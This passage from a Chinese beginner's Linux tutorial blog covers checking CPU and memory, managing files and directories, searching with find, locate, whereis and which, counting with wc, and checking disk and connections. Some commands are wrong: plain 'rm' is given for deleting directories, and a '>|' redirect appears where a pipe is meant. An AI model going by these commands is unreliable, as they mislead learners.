3microcode    : 0x1cpu MHz        : 2599.998cache size    : 16384 KBphysical id    : 0siblings    : 1core id        : 0cpu cores    : 1apicid        : 0initial apicid    : 0fpu        : yesfpu_exception    : yescpuid level    : 13wp        : yesflags        : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm rep_good nopl xtopology pni pclmulqdq ssse3 cx16 pcid sse4_1 sse4_2 x2apic popcnt aes xsave avx f16c rdrand hypervisor lahf_lm fsgsbase smep xsaveoptbugs        :bogomips    : 5199.99clflush size    : 64cache_alignment    : 64address sizes    : 46 bits physical, 48 bits virtualpower management:</code></pre><p><strong>查看内存</strong></p><blockquote><p>free -m</p><p>free -g</p><p>总内存（total） 4G，用了239M（used）还剩3G（free）</p></blockquote><pre><code>              total        used        free      shared  buff/cache   availableMem:           3771         239        3139          11         392        3234Swap:          2047           0        2047</code></pre><h3 id="2-文件目录"><a href="#2-文件目录" class="headerlink" title="2.文件目录"></a>2.文件目录</h3><p><strong>创建目录</strong></p><blockquote><p>mkdir dir_name</p><p>mkdir -p dir/dir/ 使用-p可以创建多级目录</p></blockquote><p><strong>删除目录</strong></p><blockquote><p>rm dir_name</p><p>rm -f dir_name</p></blockquote><p><strong>创建文件</strong></p><blockquote><p>touch filename</p><p>vi filename</p><p>echo “test” &gt; filename</p></blockquote><p><strong>拷贝目录</strong></p><blockquote><p>cp -r from to</p></blockquote><p><strong>进入目录</strong></p><blockquote><p>cd dir</p></blockquote><p><strong>移动目录</strong></p><blockquote><p>mv from to</p></blockquote><p><strong>拷贝文件</strong></p><blockquote><p>cp from to</p></blockquote><p><strong>查看文件</strong></p><p><strong>cat</strong> </p><p>查看所有内容， 只适合查看小文件，如果文件非常大，千万不要使用它No cat</p><blockquote><p>cat test.log</p><p>cat /data/server/test.log</p><p>或者</p><p>cat *.log</p></blockquote><p><strong>less</strong> </p><p>分页查看</p><blockquote><p>less test.log</p><p>history | less</p><p>浏览多个文件</p><p>less test1.log test2.log 使用n和p切换文件</p></blockquote><p>参数：</p><ul><li>ctrl + F - 向前移动一屏</li><li>ctrl + B - 向后移动一屏</li><li>ctrl + D - 向前移动半屏</li><li>ctrl + U - 向后移动半屏</li><li>G - 移动到最后一行</li><li>g - 移动到第一行</li><li>q / ZZ - 退出 less 命令</li></ul><p>当然了，还有我们的<code>more</code>命令</p><blockquote><p>more test.log 使用方法和less类似，它俩差不多</p></blockquote><h3 id="3-搜索"><a href="#3-搜索" class="headerlink" title="3.搜索"></a>3.搜索</h3><p><strong>Find（在整个文件树中查找）</strong></p><blockquote><p>find / -name test.log</p><p>find /data/server/ -name test.log</p></blockquote><p><strong>Locate</strong>（需要安装）</p><p>locate的特点是根据已生成的数据库查找，速度较快，但是查找的是快照数据，不准确。</p><p>安装使用</p><blockquote><p>1.yum install mlocate</p><p>2.updatedb</p></blockquote><p>然后就可以使用了，比如查看passwd</p><blockquote><p>locate passwd</p></blockquote><p>locate虽然查找速度特别快，但是它是基于快照数据，在本地有缓存的DB的，对于新的文件需要更新locate的数据库</p><blockquote><p>updatedb</p></blockquote><p><strong>whereis</strong></p><p>二进制的查找适合查找程序名称等等</p><p>举例：</p><blockquote><p>whereis java</p><p>whereis python</p></blockquote><p><strong>which</strong></p><p>查看执行文件的位置</p><blockquote><p>which java</p><p>which python</p><p>which ls</p><p>which bash</p><p>…</p></blockquote><h3 id="4-统计搜索"><a href="#4-统计搜索" class="headerlink" title="4.统计搜索"></a>4.统计搜索</h3><p><strong>统计文件个数</strong></p><blockquote><p>ls -l | grep “0-sec” |wc -l</p><p>这是由主要的3条命令组成</p><p>ls - l 然后利用管道符使用grep筛选，最后使用wc统计</p></blockquote><p><strong>统计文件行数</strong></p><blockquote><p>cat test.log | wc-l</p></blockquote><p><strong>搜索+统计</strong></p><blockquote><p>grep “/login” test.log &gt;| wc -l </p></blockquote><h3 id="5-资源查看"><a href="#5-资源查看" class="headerlink" title="5.资源查看"></a>5.资源查看</h3><p>查看磁盘</p><blockquote><p>df -h</p></blockquote><p><strong>du</strong></p><p>报告磁盘空间使用情况</p><blockquote><p>du -a</p><p>du -sh *</p></blockquote><p><strong>查看带宽（需安装，这里不演示了）</strong></p><blockquote><p>iftop</p></blockquote><p><strong>查看链接数</strong></p><p>查看某个端口的连接情况</p><blockquote><p>netstat</p></blockquote><p>统计80端口连接数量</p><blockquote><p>netstat -ntpl | grep 80|wc -l</p></blockquote><h3 id="color-green-Linux公开学习视频推荐：-https-ke-qq-com-course-434219"><a href="#color-green-Linux公开学习视频推荐：-https-ke-qq-com-course-434219" class="headerlink" title="$\color{green}{Linux公开学习视频推荐：}$https://ke.qq.com/course/434219"></a>$\color{green}{Linux公开学习视频推荐：}$<a href="https://ke.qq.com/course/434219" target="_blank" rel="noopener">https://ke.qq.com/course/434219</a></h3><h3 id="当然也可以加群857565362一起学习共同进步"><a href="#当然也可以加群857565362一起学习共同进步" class="headerlink" title="当然也可以加群857565362一起学习共同进步"></a>当然也可以加群857565362一起学习共同进步</h3>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
